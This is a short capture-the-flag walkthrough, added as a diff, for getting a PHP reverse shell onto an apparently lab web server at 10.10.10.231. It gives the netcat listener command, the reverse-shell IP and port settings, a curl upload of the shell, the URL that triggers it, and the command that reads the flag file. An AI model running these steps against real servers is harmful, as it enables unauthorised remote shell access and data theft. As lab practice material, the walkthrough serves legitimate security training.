@@ -1,0 +1,29 @@
+Side Mission: Upload Trigger
+
+Target: http://10.10.10.231/upload.php
+Upload Path: /uploads/revshell.php
+
+Objective:
+Upload a PHP reverse shell and trigger it to receive a callback.
+
+Steps:
+1. Prepare listener:
+   nc -lvnp 4444
+
+2. Modify reverse shell (php-reverse-shell.php):
+   Set:
+   $ip = 'YOUR-IP';
+   $port = 4444;
+
+3. Upload shell:
+   curl -F "file=@revshell.php" http://10.10.10.231/upload.php
+
+4. Trigger shell:
+   Visit http://10.10.10.231/uploads/revshell.php
+
+5. Callback received:
+   Use shell to access:
+   cat /home/sysadmin/flag.txt
+
+Flag:
+CTF{r3v3rs3_sh3ll_br34k}
